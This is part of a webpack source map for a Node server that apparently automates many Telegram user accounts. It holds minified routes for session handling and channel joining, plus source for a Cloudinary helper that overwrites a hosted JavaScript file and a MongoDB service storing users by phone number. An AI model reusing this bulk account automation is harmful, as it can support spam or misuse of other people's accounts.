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","sources":["../external commonjs \"axios\"","../external commonjs \"body-parser\"","../external commonjs \"cloudinary\"","../external commonjs \"cors\"","../external commonjs \"dotenv\"","../external commonjs \"express\"","../external commonjs \"imap\"","../external commonjs \"mongodb\"","../external commonjs \"node-schedule-tz\"","../external commonjs \"swagger-jsdoc\"","../external commonjs \"swagger-ui-express\"","../external commonjs \"telegram\"","../external commonjs \"telegram/client/uploads\"","../external commonjs \"telegram/events/index.js\"","../external commonjs \"telegram/sessions\"","../external node-commonjs \"child_process\"","../external node-commonjs \"fs\"","../external node-commonjs \"path\"",".././cloudinary.js",".././dbservice.js",".././mailreader.js",".././swaggerConfig.js",".././telegramManager.js",".././utils.js","../webpack/bootstrap",".././index.js"],"sourcesContent":["module.exports = require(\"axios\");","module.exports = require(\"body-parser\");","module.exports = require(\"cloudinary\");","module.exports = require(\"cors\");","module.exports = require(\"dotenv\");","module.exports = require(\"express\");","module.exports = require(\"imap\");","module.exports = require(\"mongodb\");","module.exports = require(\"node-schedule-tz\");","module.exports = require(\"swagger-jsdoc\");","module.exports = require(\"swagger-ui-express\");","module.exports = require(\"telegram\");","module.exports = require(\"telegram/client/uploads\");","module.exports = require(\"telegram/events/index.js\");","module.exports = require(\"telegram/sessions\");","module.exports = require(\"child_process\");","module.exports = require(\"fs\");","module.exports = require(\"path\");","console.log(\"in Cloudinary\");\r\nconst cloudinary = require('cloudinary');\r\nconst path = require('path');\r\nconst fs = require('fs');\r\nconst { fetchWithTimeout } = require('./utils');\r\n\r\nclass CloudinaryService {\r\n    static instance;\r\n    resources = new Map();\r\n\r\n    constructor() {\r\n        cloudinary.v2.config({\r\n            cloud_name: process.env.CL_NAME,\r\n            api_key: process.env.CL_APIKEY,\r\n            api_secret: process.env.CL_APISECRET\r\n        });\r\n    }\r\n\r\n    static async getInstance(name) {\r\n        if (!CloudinaryService.instance) {\r\n            CloudinaryService.instance = new CloudinaryService();\r\n        }\r\n        await CloudinaryService.instance.getResourcesFromFolder(name);\r\n        return CloudinaryService.instance;\r\n    }\r\n\r\n    async getResourcesFromFolder(folderName) {\r\n        console.log('FETCHING NEW FILES!! from CLOUDINARY');\r\n        await this.findAndSaveResources(folderName, 'image');\r\n    }\r\n\r\n    async createNewFolder(folderName) {\r\n        await this.createFolder(folderName);\r\n        await this.uploadFilesToFolder(folderName);\r\n    }\r\n\r\n    async overwriteFile() {\r\n        const cloudinaryFileId = \"index_nbzca5.js\";\r\n        const localFilePath = \"./src/test.js\";\r\n\r\n        try {\r\n\r\n            const result = await cloudinary.v2.uploader.upload(localFilePath, {\r\n                resource_type: 'auto',\r\n                overwrite: true,\r\n                invalidate: true,\r\n                public_id: cloudinaryFileId\r\n            });\r\n            console.log(result);\r\n        } catch (error) {\r\n            console.log(error);\r\n        }\r\n\r\n    }\r\n\r\n    async findAndSaveResources(folderName, type) {\r\n        try {\r\n            const { resources } = await cloudinary.v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });\r\n            resources.forEach(async (resource) => {\r\n                try {\r\n                    this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);\r\n                    await saveFile(resource.url, resource.public_id.split('/')[1].split('_')[0]);\r\n                } catch (error) {\r\n                    console.log(resource);\r\n                    console.log(error)\r\n                }\r\n\r\n            });\r\n        } catch (error) {\r\n            console.log(error);\r\n        }\r\n    }\r\n\r\n    async createFolder(folderName) {\r\n        try {\r\n            const result = await cloudinary.v2.api.create_folder(folderName);\r\n\r\n            return result;\r\n        } catch (error) {\r\n            console.error('Error creating folder:', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    // Function to upload files from URLs to a specific folder in Cloudinary\r\n    async uploadFilesToFolder(folderName) {\r\n        const uploadPromises = Array.from(this.resources.entries()).map(async ([key, url]) => {\r\n            try {\r\n                const result = await cloudinary.v2.uploader.upload_large(url, {\r\n                    folder: folderName,\r\n                    resource_type: 'auto',\r\n                    public_id: key, // Set the key as the public_id\r\n                });\r\n\r\n                return result;\r\n            } catch (error) {\r\n                console.error('Error uploading file:', error);\r\n                throw error;\r\n            }\r\n        });\r\n\r\n        try {\r\n            return await Promise.all(uploadPromises);\r\n        } catch (error) {\r\n            console.error('Error uploading files:', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    async printResources() {\r\n        try {\r\n            this.resources?.forEach((val, key) => {\r\n                console.log(key, \":\", val);\r\n            })\r\n        } catch (error) {\r\n            console.log(error);\r\n        }\r\n    }\r\n\r\n    get(publicId) {\r\n        try {\r\n            const result = this.resources.get(publicId)\r\n            return result || '';\r\n        } catch (error) {\r\n            console.log(error);\r\n        }\r\n    }\r\n\r\n    getBuffer(publicId) {\r\n        try {\r\n            const result = this.resources.get(publicId)\r\n            return result || '';\r\n        } catch (error) {\r\n            console.log(error);\r\n        }\r\n    }\r\n}\r\n\r\nasync function saveFile(url, name) {\r\n    const extension = url.substring(url.lastIndexOf('.') + 1, url.length);\r\n    const mypath = path.resolve(__dirname, `./${name}.${extension}`);\r\n    fetchWithTimeout(url, { responseType: 'arraybuffer' }, 2)\r\n        .then(res => {\r\n            if (res?.statusText === 'OK') {\r\n                try {\r\n                    if (!fs.existsSync(mypath)) {\r\n                        fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\r\n                        console.log(`${name}.${extension} Saved!!`);\r\n                    } else {\r\n                        fs.unlinkSync(mypath);\r\n                        fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\r\n                        console.log(`${name}.${extension} Replaced!!`);\r\n                    }\r\n                } catch (err) {\r\n                    console.error(err);\r\n                }\r\n            } else {\r\n                throw new Error(`Unable to download file from ${url}`);\r\n            }\r\n        }).catch(err => {\r\n            console.error(err);\r\n        });\r\n}\r\n\r\nmodule.exports = { CloudinaryService }\r\n\r\n\r\n\r\n","const { MongoClient, ServerApiVersion } = require('mongodb')\r\n\r\nclass ChannelService {\r\n    static instance;\r\n    client = undefined\r\n    db = undefined;\r\n    users = undefined;\r\n    statsDb = undefined;\r\n    statsDb2 = undefined;\r\n    isConnected = false;\r\n\r\n    constructor() {\r\n    }\r\n\r\n    static getInstance() {\r\n        if (!ChannelService.instance) {\r\n            ChannelService.instance = new ChannelService();\r\n        }\r\n        return ChannelService.instance;\r\n    }\r\n    static isInstanceExist() {\r\n        return !!ChannelService.instance;\r\n    }\r\n\r\n    async connect() {\r\n        if (!this.isConnected) {\r\n            console.log('trying to connect to DB......')\r\n            try {\r\n                this.client = await MongoClient.connect(process.env.mongouri, { useNewUrlParser: true, useUnifiedTopology: true, serverApi: ServerApiVersion.v1, maxPoolSize: 15 });\r\n                console.log('Connected to MongoDB');\r\n                this.isConnected = true;\r\n                this.client.on('close', () => {\r\n                    console.log('MongoDB connection closed.');\r\n                    this.isConnected = false;\r\n                });\r\n                this.db = this.client.db(\"tgclients\").collection('channels');\r\n                this.users = this.client.db(\"tgclients\").collection('users');\r\n                this.statsDb = this.client.db(\"tgclients\").collection('stats');\r\n                this.statsDb2 = this.client.db(\"tgclients\").collection('stats2');\r\n                return true;\r\n            } catch (error) {\r\n                console.log(`Error connecting to MongoDB: ${error}`);\r\n                return false;\r\n            }\r\n        } else {\r\n            console.log('MongoConnection ALready Existing');\r\n        }\r\n    }\r\n\r\n    async insertChannel(channelData) {\r\n        const {\r\n            title,\r\n            id,\r\n            username,\r\n            megagroup,\r\n            participantsCount,\r\n            broadcast\r\n        } = channelData\r\n        const cannotSendMsgs = channelData.defaultBannedRights?.sendMessages\r\n        const filter = { channelId: id.toString() };\r\n        const chat = await this.db?.findOne(filter);\r\n        if (!chat && !cannotSendMsgs && !broadcast) {\r\n            await this.db.insertOne({ channelId: id.toString(), username: username ? `@${username}` : null, title, megagroup, participantsCount });\r\n        }\r\n    }\r\n\r\n    async getChannels(limit = 50, skip = 0, k) {\r\n        const query = { megagroup: true, username: { $ne: null } };\r\n        const sort = { participantsCount: -1 };\r\n        if (k) {\r\n            query[\"$or\"] = [{ title: { $regex: k, $options: 'i' } }, { username: { $regex: k, $options: 'i' } }]\r\n        }\r\n        const options = { collation: { locale: 'en', strength: 1 } };\r\n        try {\r\n            if (k) {\r\n                await this.db?.createIndex({ title: 'text' }); // Create index on the \"title\" field for text search\r\n            }\r\n            const result = await this.db\r\n                .find(query, options)\r\n                .sort(sort)\r\n                .skip(skip)\r\n                .limit(limit)\r\n                .toArray();\r\n\r\n            return result;\r\n        } catch (error) {\r\n            console.error('Error:', error);\r\n            return [];\r\n        }\r\n    }\r\n\r\n    async insertUser(user) {\r\n        const filter = { mobile: user.mobile };\r\n        try {\r\n            const entry = await this.users.findOne(filter);\r\n            if (!entry) {\r\n                await this.users.insertOne(user);\r\n            }\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async updateUser(user, data) {\r\n        const filter = { mobile: user.mobile };\r\n        try {\r\n            const entry = await this.users.updateOne(filter, {\r\n                $set: {\r\n                    ...data\r\n                },\r\n            }, { upsert: true });\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async deleteUser(user) {\r\n        const filter = { mobile: user.mobile };\r\n        try {\r\n            const entry = await this.users.deleteOne(filter);\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async getUser(user) {\r\n        const filter = { mobile: user.mobile };\r\n        try {\r\n            const entry = await this.users.findOne(filter);\r\n            return entry\r\n        } catch (error) {\r\n            console.log(error)\r\n            return undefined\r\n        }\r\n    }\r\n\r\n    async getTempUser() {\r\n        try {\r\n            const entry = await this.users.findOne({});\r\n            return entry\r\n        